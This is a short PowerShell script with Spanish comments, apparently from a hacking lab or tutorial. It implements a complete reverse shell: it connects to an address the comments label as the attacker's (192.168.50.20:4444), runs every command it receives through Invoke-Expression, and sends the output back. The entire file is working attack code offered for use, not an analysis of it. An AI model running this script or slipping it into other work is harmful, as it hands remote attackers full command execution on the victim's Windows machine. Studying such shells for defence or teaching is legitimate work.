# Crea un cliente TCP que se conecta a la IP 192.168.50.20 en el puerto 4444 (IP y puerto del atacante)
$client = New-Object System.Net.Sockets.TCPClient("192.168.50.20", 4444)

# Obtiene el stream de datos para enviar y recibir información a través de la conexión TCP
$stream = $client.GetStream()

# Crea un escritor (writer) para enviar datos a través del stream
$writer = New-Object System.IO.StreamWriter($stream)

# Configura el escritor para vaciar el buffer automáticamente cada vez que se escribe una línea
$writer.AutoFlush = $true   # Así no hay que llamar manualmente a Flush()

# Envía un mensaje inicial al atacante para confirmar que la conexión fue establecida
$writer.WriteLine('hola desde windows')

# Crea un lector (reader) para recibir datos desde el stream
$reader = New-Object System.IO.StreamReader($stream)

# Bucle infinito para mantener la conexión activa y procesar comandos recibidos
while ($true) {
    # Lee una línea (comando) enviada desde el atacante
    $data = $reader.ReadLine()

    # Si el comando es "exit", termina el bucle y cierra la conexión
    if ($data -eq "exit") { break }

    try {
        # Ejecuta el comando recibido y captura cualquier salida o error
        $output = Invoke-Expression $data 2>&1 | Out-String
    } catch {
        # En caso de error, captura el mensaje de excepción para enviarlo
        $output = $_.Exception.Message
    }

    # Envía la salida o el error resultante al atacante
    $writer.WriteLine($output)
}

# Cierra la conexión TCP cuando se termina el bucle
$client.Close()